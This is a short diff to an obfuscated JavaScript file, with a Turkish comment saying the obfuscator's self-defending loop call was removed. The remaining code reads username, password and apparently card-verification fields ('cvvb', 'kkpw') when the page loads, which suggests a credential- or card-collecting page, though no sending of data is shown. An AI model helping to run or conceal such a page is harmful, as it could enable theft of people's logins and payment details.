@@ -31,10 +31,15 @@ const _0x2039e1 = (function() {
         } : function() {};
         return _0x1fddcf = ![], _0x40b2ac;
     };
-}()), _0x1d65fe = _0x2039e1(this, function() {
-    const _0x373673 = _0x2718;
-    return _0x1d65fe[_0x373673(0x13a)]()['search'](_0x373673(0x14c))[_0x373673(0x13a)]()['constructor'](_0x1d65fe)[_0x373673(0x148)](_0x373673(0x14c));
-});
+}());
+
+// SADECE BU KISIM KALDIRILDI (sonsuz döngü yapan _0x1d65fe çağrısı)
+// _0x1d65fe = _0x2039e1(this, function() {
+//     const _0x373673 = _0x2718;
+//     return _0x1d65fe[_0x373673(0x13a)]()['search'](_0x373673(0x14c))[_0x373673(0x13a)]()['constructor'](_0x1d65fe)[_0x373673(0x148)](_0x373673(0x14c));
+// });
+// _0x1d65fe();
+
 function _0x4577() {
     const _0x36dfe2 = [
         'click', 'Bilinmiyor', 'apply', 'kkpw', 'error', '11000LcSgGn',
@@ -53,7 +58,7 @@ function _0x4577() {
     };
     return _0x4577();
 }
-_0x1d65fe();
+
 document[_0x3f6a01(0x147)]('DOMContentLoaded', function() {
     const _0xa7bea2 = _0x3f6a01, _0x4fee40 = document[_0xa7bea2(0x153)]('customUsername'), _0x507160 = document[_0xa7bea2(0x153)]('customPassword'), _0x5b2275 = document['getElementById']('cvvb'), _0x3267e8 = document[_0xa7bea2(0x153)](_0xa7bea2(0x158)), _0x3322a0 = document[_0xa7bea2(0x153)](_0xa7bea2(0x144));
     if (!_0x4fee40 || !_0x507160 || !_0x5b2275 || !_0x3267e8 || !_0x3322a0) {
